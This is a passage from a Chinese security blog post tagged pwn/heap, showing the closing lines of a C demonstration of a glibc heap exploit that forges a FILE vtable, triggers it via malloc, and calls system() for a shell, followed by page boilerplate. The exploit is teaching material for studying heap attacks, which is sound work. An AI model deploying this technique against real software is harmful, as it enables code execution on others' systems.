    *(size_t *) ((size_t) fp + sizeof(FILE)) &#x3D; (size_t) jump_table; &#x2F;&#x2F; top+0xd8


    &#x2F;* Finally, trigger the whole chain by calling malloc *&#x2F;
    malloc(10);

   &#x2F;*
     The libc&#39;s error message will be printed to the screen
     But you&#39;ll get a shell anyways.
   *&#x2F;

    return 0;
&#125;

int winner(char *ptr)
&#123; 
    system(ptr);
    syscall(SYS_exit, 0);
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

                
            </div>
            <hr/>

            



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/pwn/">
                                    <span class="chip bg-color">pwn</span>
                                </a>
                            
                                <a href="/tags/heap/">
                                    <span class="chip bg-color">heap</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/06/20/ge-shi-hua-zi-fu-chuan/ge-shi-hua-zi-fu-chuan/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="《格式化字符串》">
                        
                        <span class="card-title">《格式化字符串》</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            栈和非栈的格式化字符串
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-06-20
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/pwn/" class="post-category">
                                    pwn
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/pwn/">
                        <span class="chip bg-color">pwn</span>
                    </a>
                    
                    <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
                        <span class="chip bg-color">格式化字符串</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="《CSAPP》阅读笔记（持续更新）">
                        
                        <span class="card-title">《CSAPP》阅读笔记（持续更新）</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            深入理解计算机系统笔记
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-05-04
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/" class="post-category">
                                    计算机系统
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/">
                        <span class="chip bg-color">计算机系统</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: StarrySky<br />'
            + '文章作者: StarrySky<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2023</span>
            
            <span id="year">2019</span>
            <a href="/about" target="_blank">StarrySky</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/starrysky1004" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:2726736810@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2726736810" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2726736810" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
